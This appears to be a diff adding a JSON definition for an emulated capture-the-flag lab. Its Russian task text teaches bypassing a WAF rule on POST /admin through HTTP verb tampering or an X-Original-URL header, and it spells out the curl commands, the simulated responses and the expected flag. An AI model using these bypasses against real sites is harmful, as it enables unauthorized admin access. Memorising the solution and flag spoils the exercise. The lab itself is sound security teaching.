@@ -1,0 +1,23 @@
+{
+  "id": "web-waf-evasion-basics",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{w4f_v3rb_t4mp3r1ng_byp4ss}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: WAF — базовые техники обхода\n\nWAF режет `POST /admin` (правило по методу + пути). Обойди правило через\nverb tampering (смени метод) или заголовок `X-Original-URL`.\n\n1. POST блокируется:\n\n   curl -s -X POST https://shop.local/admin\n\n2. Другой метод проходит мимо правила:\n\n   curl -s -X PATCH https://shop.local/admin > found.txt\n\n   (альтернатива: curl -s -H 'X-Original-URL: /admin' https://shop.local/ )\n\n3. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local за WAF)",
+      "cases": [
+        { "match": "X-Original-URL", "example": "-s -H 'X-Original-URL: /admin' https://shop.local/", "output": "<h1>Admin panel</h1><p>flag: nto{w4f_v3rb_t4mp3r1ng_byp4ss}</p>\n" },
+        { "match": "-X PATCH|-X PUT|PATCH|PUT", "example": "-s -X PATCH https://shop.local/admin", "output": "<h1>Admin panel</h1><p>flag: nto{w4f_v3rb_t4mp3r1ng_byp4ss}</p>\n" },
+        { "match": "-X POST|POST", "example": "-s -X POST https://shop.local/admin", "output": "HTTP/1.1 403 Forbidden\nServer: waf\n\nblocked by WAF (rule 900200: admin POST)\n" },
+        { "match": "admin", "example": "-s https://shop.local/admin", "output": "HTTP/1.1 403 Forbidden\n\nadmin area — authentication required\n" },
+        { "match": "shop\\.local", "example": "-s https://shop.local/", "output": "<!doctype html><title>shop</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется shop.local за WAF.\n"
+    }
+  }
+}
